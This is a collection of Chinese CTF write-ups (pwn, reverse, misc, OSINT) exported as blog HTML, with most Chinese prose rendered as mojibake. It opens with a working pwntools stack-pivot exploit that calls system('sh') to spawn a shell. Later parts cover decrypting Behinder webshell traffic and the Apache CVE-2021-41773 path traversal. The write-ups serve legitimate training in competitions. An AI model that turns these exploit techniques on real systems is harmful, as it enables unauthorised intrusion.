class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    <span class="keyword">return</span> remote(IP, PORT) <span class="keyword">if</span> <span class="keyword">not</span> is_debug <span class="keyword">else</span> process()</span><br><span class="line"></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">r = <span class="keyword">lambda</span> x=<span class="literal">None</span>: p.recv() <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">r_leak_libc_64 = <span class="keyword">lambda</span>: u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r_leak_libc_32 = <span class="keyword">lambda</span>: u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line">p = connect()</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Welcome to H&amp;NCTF, my friend. What&#x27;s your name?&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">0x2c</span></span><br><span class="line">s(payload)</span><br><span class="line">ru(payload)</span><br><span class="line"></span><br><span class="line">leak = u32(r(<span class="number">4</span>))</span><br><span class="line">buf_addr = leak - (<span class="number">0xfff93748</span> - <span class="number">0xfff93710</span>)</span><br><span class="line">success(<span class="string">f&quot;buf_addr -&gt;<span class="subst">&#123;<span class="built_in">hex</span>(buf_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">read = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">vuln = <span class="number">0x08048639</span></span><br><span class="line">bss = <span class="number">0x804a000</span></span><br><span class="line">system = <span class="number">0x0804857D</span></span><br><span class="line"></span><br><span class="line">payload = p32(read) + p32(vuln) + p32(<span class="number">0</span>) + p32(bss) + p32(<span class="number">0x4</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x2c</span>,<span class="string">b&#x27;a&#x27;</span>) + p32(buf_addr - <span class="number">4</span>)</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">0.3</span>)</span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line">s(<span class="string">b&#x27;sh;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Welcome to H&amp;NCTF, my friend. What&#x27;s your name?&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">0x4</span></span><br><span class="line">s(payload)</span><br><span class="line">ru(payload)</span><br><span class="line"></span><br><span class="line">buf_addr = buf_addr</span><br><span class="line">success(<span class="built_in">hex</span>(buf_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buf_addr = buf_addr - (<span class="number">0xffb45f80</span> - <span class="number">0xffb45f4c</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p32(system) + p32(bss) + p32(bss)</span><br><span class="line">payload = payload.ljust(<span class="number">0x2c</span>,<span class="string">b&#x27;a&#x27;</span>) + p32(buf_addr - <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æœ€åå¾—åˆ° flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">H&amp;NCTF&#123;06b0540d-df19-4b49-9e63-fb7b8b67f8f9&#125;</span><br></pre></td></tr></table></figure><h1 id="misc"><a class="markdownIt-Anchor" href="#misc">#</a> Misc:</h1><h2 id="mancraft-å¨±ä¹é¢˜"><a class="markdownIt-Anchor" href="#mancraft-å¨±ä¹é¢˜">#</a> ManCraft - å¨±ä¹é¢˜:</h2><pre><code>ä¸€ä¸ªæˆ‘çš„ä¸–ç•Œçš„æœåŠ¡å™¨ï¼Œä¸‹è½½1.20.4ç‰ˆæœ¬ä¹‹åè¿›å…¥æœåŠ¡å™¨ï¼Œæ ¹æ®æç¤ºï¼Œå…ˆç»‘å®šé˜Ÿä¼çš„tokenï¼Œä¹‹åè¿…é€Ÿå‘è‚²ï¼Œç„¶åå‹¾å¼•é‡‘ç”²åƒµå°¸ï¼Œä¹Ÿå°±æ˜¯åŠ³å¤§ï¼ŒæŠŠå®ƒå‹¾å¼•åˆ°é™·é˜±é‡Œæ€æ­»ï¼Œç„¶åå°±èƒ½å¤Ÿæ‹¿åˆ°ä¸€ä¸ªkeyï¼Œä¹‹åç”¨è¿™ä¸ªkeyå°±èƒ½æ‹¿åˆ°flagã€‚</code></pre><p><img data-src="https://img-blog.csdnimg.cn/img_convert/cf711c6120000fcbd5528f8372572795.png" alt="Screenshot 2024-05-12 155018.png"><img data-src="https://img-blog.csdnimg.cn/img_convert/6bb03b4ea780a0a6b4dc67a0ebe6dd84.png" alt="Screenshot 2024-05-12 155005.png"></p><h2 id="osintå¤ç°"><a class="markdownIt-Anchor" href="#osintå¤ç°">#</a> osintï¼ˆå¤ç°ï¼‰:</h2><p><span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyNC9wbmcvNDA2NTcyMzYvMTcxNTY5NzI1MDA1My1iN2ZkZGE1ZC1kOGFiLTRiMTgtYTc1NS02ZGI1MDBiN2JkZDcucG5nP19sYWtlX2NhcmQ9JTdCJTIyc3JjJTIyJTNBJTIyaHR0cHMlM0ElMkYlMkZ3d3cueXVxdWUuY29tJTJGYXR0YWNobWVudHMlMkZ5dXF1ZSUyRjAlMkYyMDI0JTJGcG5nJTJGNDA2NTcyMzYlMkYxNzE1Njk3MjUwMDUzLWI3ZmRkYTVkLWQ4YWItNGIxOC1hNzU1LTZkYjUwMGI3YmRkNy5wbmclMjIlMkMlMjJuYW1lJTIyJTNBJTIyb25pc3QucG5nJTIyJTJDJTIyc2l6ZSUyMiUzQTIwMTk2MDklMkMlMjJleHQlMjIlM0ElMjJwbmclMjIlMkMlMjJzb3VyY2UlMjIlM0ElMjIlMjIlMkMlMjJzdGF0dXMlMjIlM0ElMjJkb25lJTIyJTJDJTIyZG93bmxvYWQlMjIlM0F0cnVlJTJDJTIydGFza0lkJTIyJTNBJTIydWQzNTY4NGExLWRhNmMtNDRkNS1hMTk2LWI1OGM1NTFhMTYwJTIyJTJDJTIydGFza1R5cGUlMjIlM0ElMjJ1cGxvYWQlMjIlMkMlMjJ0eXBlJTIyJTNBJTIyaW1hZ2UlMkZwbmclMjIlMkMlMjJfX3NwYWNpbmclMjIlM0ElMjJib3RoJTIyJTJDJTIybW9kZSUyMiUzQSUyMnRpdGxlJTIyJTJDJTIyaWQlMjIlM0ElMjJ1MDJiMjFiOWMlMjIlMkMlMjJtYXJnaW4lMjIlM0ElN0IlMjJ0b3AlMjIlM0F0cnVlJTJDJTIyYm90dG9tJTIyJTNBdHJ1ZSU3RCUyQyUyMmNhcmQlMjIlM0ElMjJmaWxlJTIyJTdE">onist.png</span><br><img data-src="https://img-blog.csdnimg.cn/img_convert/c34220ecf9f8203e1a39b8eddee930af.png" alt="onist.png"><br> æº¯æºçš„é¢˜ï¼Œä¸€å¼ å›¾ç‰‡ï¼Œå…‰æ˜¯å›¾ç‰‡æ¥çœ‹ï¼Œä¼¼ä¹åªæœ‰ä¸¤ç§å¯èƒ½ï¼Œèµ·é£æˆ–è€…é™è½ï¼Œåˆå› ä¸ºé¢˜ç›®è¦æ±‚æˆ‘ä»¬è¾“å…¥ç›®çš„åœ°ï¼Œæ‰€ä»¥ï¼Œå¦‚æœæ˜¯éš¾åº¦ä¸é«˜çš„è¯ï¼Œè¿™å„¿åº”è¯¥æ˜¯ç›®çš„åœ°ã€‚<br>æ£€æŸ¥å›¾ç‰‡å±æ€§ï¼Œå‘ç°è¿™å¼ ç…§ç‰‡æœ€åä¾æ¬¡çš„ä¿®æ”¹æ—¶é—´æ˜¯ 4 æœˆ 23 æ—¥ä¸‹åˆ 3 ç‚¹å¤šï¼Œè¿™å¼ ç…§ç‰‡å¾ˆæ˜æ˜¾æ˜¯æ™šä¸Šæ‹æ‘„çš„ï¼Œæ‰€ä»¥ï¼Œç…§ä¾‹æ¥è¯´ï¼Œè¿™å¼ å›¾åº”è¯¥æ˜¯åœ¨ä¹‹å‰çš„æ™šä¸Šæ‹æ‘„çš„ï¼Œæ‰€ä»¥ï¼Œå…ˆä» 4 æœˆ 22 æ—¥æ™šä¸Šåˆ° 23 æ—¥å‡Œæ™¨çš„èˆªç­æ¥çœ‹ã€‚<br>å¦å¤–ï¼Œæ ¹æ®æœºç¿¼ä¸Šçº¢è‰²çš„é‚£ä¸ªçº¢è‰²çš„å›¾ï¼Œåœ¨ç½‘ä¸Šæ‰¾åˆ°äº†åº”è¯¥æ˜¯æµ·å—èˆªç©ºçš„é£æœºï¼Œä¸”å·¦è¾¹æ•°å­—ï¼Œæœ‰ä¸ª 22ï¼Œå¤§æ¦‚æ¨æµ‹æ³¨å†Œå·æ˜¯ X-22XXï¼Œå·¦è¾¹çš„å­—æ¯ï¼Œå¥½åƒæ˜¯æ ¹æ®å›½å®¶ä¸åŒå®šçš„ï¼Œä¸­å›½çš„æ˜¯ Bã€‚<br>ä¹‹åï¼Œæœç´¢æ³¨å†Œå·ä¸º B-22ï¼Œèƒ½å¤ŸçŸ¥é“æœ‰å‡ ä¸ªï¼š<br><img data-src="https://img-blog.csdnimg.cn/img_convert/04d6e4cf5081298b258bc0551c176f39.png" alt="Screenshot 2024-05-14 230753.png"><br> ä¹‹åï¼Œé€šè¿‡æœç´¢ 4 æœˆ 22 æ—¥æ™šä¸Šåˆ° 4 æœˆ 23 æ—¥å‡Œæ™¨é‚£æ®µæ—¶é—´çš„æµ·å—èˆªç©ºçš„é£æœºï¼Œå¤§è‡´å¯ä»¥å¾—åˆ°èˆªç­å·ä¸º HU7006ã€‚<br>æ‹¿åˆ°äº†èˆªç­ä¹‹åï¼Œé€šè¿‡èˆªç­å’Œæ—¶é—´æœç´¢ï¼Œèƒ½æœåˆ°èµ·å§‹åœ°å’Œç›®çš„åœ°ï¼Œç›®çš„åœ°æ˜¯æµ·å£ç¾å…°å›½é™…æœºåœºã€‚<br>æœ€åï¼Œæ„Ÿè§‰è¿æ°”ä½¿ç„¶ï¼Œåœ¨æœºåœºé™„è¿‘é‡åˆ°ä¸ªæœ‰ç‚¹çœ¼ç†Ÿçš„è·¯çš„å¼§åº¦ï¼ŒæŠ±ç€è¯•ä¸€è¯•çš„æƒ³æ³•ï¼ŒæŠŠåœ°å€å†™ä¸Šå»ï¼Œç»“æœæ­£ç¡®äº†ï¼š<br><img data-src="https://img-blog.csdnimg.cn/img_convert/1e47424f573bfa5881e1c1ca5ccdbc13.png" alt="Screenshot 2024-05-14 231654.png"><br> æœ€å flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">H-NCTF&#123;ae53219d0966&#125;</span><br></pre></td></tr></table></figure><h1 id="re"><a class="markdownIt-Anchor" href="#re">#</a> Re</h1><h2 id="æœ€å–œæ¬¢çš„é€†å‘é¢˜"><a class="markdownIt-Anchor" href="#æœ€å–œæ¬¢çš„é€†å‘é¢˜">#</a> æœ€å–œæ¬¢çš„é€†å‘é¢˜</h2><p>ç­¾åˆ°é¢˜<br> v1=a1 [5]=105<br>64 ä½<br><img data-src="https://img-blog.csdnimg.cn/img_convert/6aecae5c25ab966f7031681129163ad1.png" alt="image.png"><br><img data-src="https://img-blog.csdnimg.cn/img_convert/9a680c7b9571f95c95e3387981104837.png" alt="image.png"></p><h2 id="imagepng"><a class="markdownIt-Anchor" href="#imagepng">#</a> <img data-src="https://img-blog.csdnimg.cn/img_convert/126e38404d285530ded60d084a24f164.png" alt="image.png"></h2><h2 id="hnwna"><a class="markdownIt-Anchor" href="#hnwna">#</a> hnwna</h2><p><img data-src="https://img-blog.csdnimg.cn/img_convert/1e45abae7e7b19ba49bf20024e72dcb7.png" alt="image.png"><br> ä¸€ä¸ª CSharp å†™çš„å°æ¸¸æˆ<br>æ–¹æ³•ä¸€ï¼š<br>ç”¨ ILSPY æ‰“å¼€ä¸‹é¢çš„æ–‡ä»¶<br><img data-src="https://img-blog.csdnimg.cn/img_convert/e3cd66f1b87fdd0bf564ea75d5a30156.png" alt="image.png"><br> æœç´¢æ‰¾åˆ°å…³é”®å‡½æ•°äº†ï¼ˆä¸€å¼€å§‹æœç´¢åŒºåŸŸä¸å¯¹ï¼Œå¯¼è‡´æ‰¾ä¸åˆ°å…³é”®å‡½æ•°ï¼‰<br><img data-src="https://img-blog.csdnimg.cn/img_convert/47014959c6e7273ea815c97eeb7e218c.png" alt="image.png"></p><p>å‡½æ•° a ä¸ºå‡¯æ’’ï¼Œif åˆ¤æ–­é‚£é‡Œç§»ä½ä¸º 5<br><img data-src="https://img-blog.csdnimg.cn/img_convert/1bae176c78c6cdaa6215f186e6a11ef8.png" alt="image.png"><br> åŠ å¯†</p><p><img data-src="https://img-blog.csdnimg.cn/img_convert/6c27a0a6a4f7087be4e37c1833102ae7.png" alt="image.png"><br> æ–¹æ³•äºŒï¼šdnspyï¼Œç±»ä¼¼äºç ´è§£</p><h2 id="do-you-know-swddwait"><a class="markdownIt-Anchor" href="#do-you-know-swddwait">#</a> DO YOU KNOW SWDD?ï¼ˆwaitï¼‰</h2><p>32 ä½æ‰“å¼€ idaï¼Œå‡ºç° SMCã€‚<br><img data-src="https://img-blog.csdnimg.cn/img_convert/ed5d966cbed038fecbb66e8ec4e749c6.png" alt="image.png"><br> åŠ¨æ€è°ƒè¯•<br><img data-src="https://img-blog.csdnimg.cn/img_convert/e690d825722feb18cba7e78cb45b899c.png" alt="image.png"><br> åœ¨å¯¼å…¥è¡¨ä¸­æœ‰ virtualprotect å‡½æ•°ï¼Œè¿™é‡Œå¯¹å†…å­˜æƒé™è¿›è¡Œäº†ä¿®æ”¹ï¼Œå¤§æ¦‚ç‡æ˜¯ SMCã€‚<br><img data-src="https://img-blog.csdnimg.cn/img_convert/23f0e00acb661a123f7a56a687cce303.png" alt="image.png"><br> çœ‹ 41127B å‡½æ•° (æ–­ç‚¹ä½ç½®ä¸‹é”™äº†ï¼Œç…§ç€ wp éƒ½èƒ½é”™ï¼Œæœäº†ï¼‰</p><p><img data-src="https://img-blog.csdnimg.cn/img_convert/5c2fffc54e63b92ab40b173a92efc026.png" alt="image.png"><br> çœ‹ 4113D9<br><img data-src="https://img-blog.csdnimg.cn/img_convert/c71af45348c34fc31f3a6dd8a76c1a42.png" alt="image.png"><br><img data-src="https://img-blog.csdnimg.cn/img_convert/1282a4aa673fd5c21742692aaa5e44e1.png" alt="image.png"><br>p ç„¶å f5<br><img data-src="https://img-blog.csdnimg.cn/img_convert/fadbd50ad886b850ef2f02097879bfc2.png" alt="image.png"><br> å¯çŸ¥æ˜¯å‡¯æ’’ç§»ä½ 10 ä½<br><img data-src="https://img-blog.csdnimg.cn/img_convert/0c76881393aa4b6938c1c4e751019f5d.png" alt="image.png"></p><h2 id="childmaze"><a class="markdownIt-Anchor" href="#childmaze">#</a> childmaze</h2><p><img data-src="https://img-blog.csdnimg.cn/img_convert/6b52a1d3bffc480f56e4e4e9438960f9.png" alt="image.png"><br> è¿·å®«é—®é¢˜<br>æ–¹æ³•ä¸€ï¼šé™æ€åˆ†æ<br>æ‰¾åˆ°å…³é”®æ•°æ®éƒ¨åˆ†ï¼ˆä¸æ˜“æ‰¾åˆ°ï¼‰ï¼Œäº¤å‰å¼•ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s = &quot;H&#x27;L@PC&#125;Ci625`hG2]3bZK4&#123;1~&quot;</span><br><span class="line"></span><br><span class="line">for i in range(len(s)):</span><br><span class="line">    print(chr(ord(s[i]) ^ (i % 7)), end=&quot;&quot;)</span><br></pre></td></tr></table></figure><p>æ–¹æ³•äºŒï¼šè°ƒè¯•<br>åœ¨åˆ¤æ–­è·³è½¬çš„æ—¶å€™ä¸‹ä¸ªæ–­ç‚¹ä¿®æ”¹ zf æ ‡è¯†ç¬¦æˆ–è€…æ”¹ä¸º jnz éƒ½èƒ½å®ç°ç›´æ¥è¾“å‡º flag<br>emmIDA ç‰ˆæœ¬é—®é¢˜å§ï¼Œè¯†åˆ«ä¸å‡º rustã€‚ã€‚ã€‚ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTFerçš„æ¯”èµ›ä¹‹è·¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Game </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€2024ã€‘é«˜æ ¡ç½‘ç»œå®‰å…¨ç®¡ç†è¿ç»´èµ›</title>
      <link href="/posts/fe4eec6d.html"/>
      <url>/posts/fe4eec6d.html</url>
      
        <content type="html"><![CDATA[<p>æ¯”èµ›æ—¶é—´ï¼š2024-05-06</p><h2 id="re-easyre"><a class="markdownIt-Anchor" href="#re-easyre">#</a> Re-easyre</h2><p>åŸºæœ¬çš„ base64 æ¢è¡¨ï¼Œç”¨ CyberChef è§£å¯†</p><h2 id="å›¾ç‰‡png"><a class="markdownIt-Anchor" href="#å›¾ç‰‡png">#</a> <img data-src="https://img-blog.csdnimg.cn/img_convert/98e1f9771361bda19e93bee54d1a2e3f.png" alt="å›¾ç‰‡.png"></h2><h2 id="re-babyre"><a class="markdownIt-Anchor" href="#re-babyre">#</a> Re-babyre</h2><p>è¿›å…¥ä¸»å‡½æ•°ï¼Œå‘ç°è¾“å…¥å››æ¬¡ çœ‹ä¸€ä¸‹å°±çŸ¥é“æ˜¯å¤§æ•°æ±‚è§£<br> (å½“åˆå†™çš„æ—¶å€™å·®ä¸å¤š ä¸çŸ¥é“ä¸ºä»€ä¹ˆç¬¬å››ä¸ªæ€»æ˜¯ç®—é”™â€¦)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()  <span class="comment"># è®¾ç½®ä¸€ä¸ªè§£æ–¹ç¨‹çš„ç±»Solver(å¿…é¡»è¦è®¾ç½®ï¼‰</span></span><br><span class="line"></span><br><span class="line">v5=BitVec(<span class="string">&#x27;v5&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">v6=BitVec(<span class="string">&#x27;v6&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">v7=BitVec(<span class="string">&#x27;v7&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">v8=BitVec(<span class="string">&#x27;v8&#x27;</span>,<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">s.add(v5 + <span class="number">1380855784</span> == <span class="number">907301700</span>)</span><br><span class="line"></span><br><span class="line">s.add((v6 | <span class="number">0x8E03BEC3</span>) - <span class="number">3</span> * (v6 &amp; <span class="number">0x71FC413C</span>) + v6 == -<span class="number">1876131848</span>)</span><br><span class="line"></span><br><span class="line">s.add(v7&lt;=<span class="number">0x10000000</span>)</span><br><span class="line">s.add(<span class="number">4</span> * ((~v7 &amp; <span class="number">0xA8453437</span>) + <span class="number">2</span> * ~(~v7 | <span class="number">0xA8453437</span>))</span><br><span class="line">     + -<span class="number">3</span> * (~v7 | <span class="number">0xA8453437</span>)</span><br><span class="line">     + <span class="number">3</span> * ~(v7 | <span class="number">0xA8453437</span>)</span><br><span class="line">     - (-<span class="number">10</span> * (v7 &amp; <span class="number">0xA8453437</span>)</span><br><span class="line">      + (v7 ^ <span class="number">0xA8453437</span>)) == <span class="number">551387557</span>)</span><br><span class="line"></span><br><span class="line">s.add(v8&lt;=<span class="number">0x10000000</span>)</span><br><span class="line">s.add(<span class="number">11</span> * ~(v8 ^ <span class="number">0xE33B67BD</span>)</span><br><span class="line">     + <span class="number">4</span> * ~(~v8 | <span class="number">0xE33B67BD</span>)</span><br><span class="line">     - (<span class="number">6</span> * (v8&amp; <span class="number">0xE33B67BD</span>)</span><br><span class="line">      + <span class="number">12</span> * ~(v8 | <span class="number">0xE33B67BD</span>))</span><br><span class="line">     + <span class="number">3</span> * (v8 &amp; <span class="number">0xD2C7FC0C</span>)</span><br><span class="line">     + -<span class="number">5</span> * v8</span><br><span class="line">     - <span class="number">2</span> * ~(v8 | <span class="number">0xD2C7FC0C</span>)</span><br><span class="line">     + ~(v8 | <span class="number">0x2D3803F3</span>)</span><br><span class="line">     + <span class="number">4</span> * (v8 &amp; <span class="number">0x2D3803F3</span>)</span><br><span class="line">     - -<span class="number">2</span> * (v8 | <span class="number">0x2D3803F3</span>) == -<span class="number">837785892</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s.check())<span class="comment">#checkæ˜¯ä¿è¯æœ‰è§£</span></span><br><span class="line">answer=s.model()<span class="comment">#modelæ˜¯è¾“å‡ºè¿ç®—ç»“æœ</span></span><br><span class="line"><span class="built_in">print</span>(answer)</span><br><span class="line"></span><br><span class="line">data=[<span class="number">3821413212</span>,<span class="number">98124621</span>,<span class="number">78769651</span>,<span class="number">67321987</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span>+<span class="string">&#x27;%08x-&#x27;</span>%data[<span class="number">0</span>]+<span class="string">&#x27;%08x-&#x27;</span>%data[<span class="number">1</span>]+<span class="string">&#x27;%08x-&#x27;</span>%data[<span class="number">2</span>]+<span class="string">&#x27;%08x&#x27;</span>%data[<span class="number">3</span>]+<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;e3c6235c-05d9434d-04b1edf3-04034083&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="misc-ç­¾åˆ°"><a class="markdownIt-Anchor" href="#misc-ç­¾åˆ°">#</a> Misc - ç­¾åˆ°</h2><p>ä¸€å¼  GIF å›¾ï¼Œæ‹–åˆ° pr é‡Œé¢ä¸€å¸§ä¸€å¸§çœ‹ï¼Œç¬¬ä¸€å¸§æ˜¯ï¼šFlag is the ROT13 of â€¦<br> ä¹‹åçš„æ¯ä¸€å¸§åˆå¹¶èµ·æ¥å°±æ˜¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">synt&#123;jrypbzr-gb-pbzcrgvgvba&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åé€šè¿‡ ROT13 è§£å¯†ï¼Œå¾—åˆ° flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;welcome-to-competition&#125; </span><br></pre></td></tr></table></figure><h2 id="misc-easyshellå¤ç°"><a class="markdownIt-Anchor" href="#misc-easyshellå¤ç°">#</a> Misc-easyshellï¼ˆå¤ç°ï¼‰</h2><p>å†°èè¿™ä¸ª webShell çš„æµé‡åˆ†æï¼Œæ¨æµ‹æ˜¯å†°è 3.0ï¼Œä½¿ç”¨é»˜è®¤å¯†ç  rebeyond çš„ md5 åŠ å¯†ç„¶åå–å‰ 16 ä½ä½œä¸º key è¿›è¡Œ AES è§£å¯†ï¼Œæˆ–è€…ç›´æ¥é€šè¿‡ ï¼ˆ <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21lbG9keTI3L2JlaGluZGVyX2RlY3J5cHQ=">https://github.com/melody27/behinder_decrypt</span> ï¼‰  è¿›è¡Œè§£å¯†ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 py_decrypt.py -f easyshell.pcap | tee result</span><br></pre></td></tr></table></figure><p>è·å¾—ç›¸åº”çš„è¯·æ±‚å’Œå“åº”çš„å†…å®¹ã€‚<br>é€šè¿‡å¦‚ä¸‹ä¸¤ä¸ªå‘½ä»¤åˆ†åˆ«æå–æ–‡ä»¶çš„ä¿¡æ¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat result | grep &#123;\&quot;msg\&quot;:\&quot;</span><br><span class="line">cat result | grep $mode=\&quot;ZG93bmxvYWRQYXJ0\&quot;;</span><br></pre></td></tr></table></figure><p>ä¹‹åèƒ½å¤Ÿè·å–åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œä¹‹åé€šè¿‡åˆ›å»ºä¸€ä¸ª CRC å€¼ä¸è·å–çš„å‹ç¼©åŒ… CRC å€¼ç›¸åŒçš„ zip åŒ…ï¼Œç„¶åè¿›è¡Œæ˜æ–‡æ”»å‡»ï¼Œæœ€åè·å¾— flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;70854278-ea0c-462e-bc18-468c7a04a505&#125;</span><br></pre></td></tr></table></figure><h2 id="misc-gatewayå¤ç°"><a class="markdownIt-Anchor" href="#misc-gatewayå¤ç°">#</a> Misc-Gatewayï¼ˆå¤ç°ï¼‰</h2><p>åœ¨é™„ä»¶ baseinfoSet.json ä¸­æœ‰ä¸ª â€œbaseinfoSet_TELECOMPASSWORDâ€: â€œ106&amp;112&amp;101&amp;107&amp;127&amp;101&amp;104&amp;49&amp;57&amp;56&amp;53&amp;56&amp;54&amp;56&amp;49&amp;51&amp;51&amp;105&amp;56&amp;103&amp;106&amp;49&amp;56&amp;50&amp;5 6&amp;103&amp;102&amp;56&amp;52&amp;101&amp;104&amp;102&amp;105&amp;53&amp;101&amp;53&amp;102&amp;129&amp;â€,<br> åœ¨ç½‘ä¸Šæœç´¢ baseinfoSet_TELECOMPASSWORD   å­˜åœ¨è§£å¯†è„šæœ¬ï¼Œç›´æ¥è§£å¯†å¾—åˆ° flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ad1985868133e8cf1828cb84adbe5a5b&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">code=&#x27;106&amp;112&amp;101&amp;107&amp;127&amp;101&amp;104&amp;49&amp;57&amp;56&amp;53&amp;56&amp;54&amp;56&amp;49&amp;51&amp;51&amp;105&amp;56&amp;103&amp;106&amp;49&amp;56&amp;50&amp;56&amp;103&amp;102&amp;56&amp;52&amp;101&amp;104&amp;102&amp;105&amp;53&amp;101&amp;53&amp;102&amp;129&amp;&#x27;[:-1]    # &quot;baseinfoSet_TELECOMPASSWORD&quot;:&quot;114&amp;73&amp;55&amp;110&amp;69&amp;37&amp;53&amp;113&amp;&quot;</span><br><span class="line">list=map(int,code.split(&#x27;&amp;&#x27;))</span><br><span class="line">result=[]</span><br><span class="line">for i in list:</span><br><span class="line">    if i &gt; 57:</span><br><span class="line">       i-=4</span><br><span class="line">    result.append(chr(i))</span><br><span class="line">print (&#x27;&#x27;.join(result))</span><br></pre></td></tr></table></figure><h2 id="misc-apacheå¤ç°"><a class="markdownIt-Anchor" href="#misc-apacheå¤ç°">#</a> Misc-Apacheï¼ˆå¤ç°ï¼‰</h2><p>åœ¨åšå®¢é‡Œç›´æ¥æœç´¢ httpd:2.4.49-buster æ¼æ´  å¯çŸ¥ï¼Œæœ‰ä¸ª CVE-2021-41773 çš„è·¯å¾„ç©¿è¶Šæ¼æ´ï¼Œç›¸å…³è¿æ¥å¦‚ä¸‹<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzU5OTc1NDM5L2FydGljbGUvZGV0YWlscy8xMjUyMjU5NDk="> Apache HTTP Server è·¯å¾„ç©¿è¶Šæ¼æ´å¤ç° (CVE-2021-41773)-CSDN 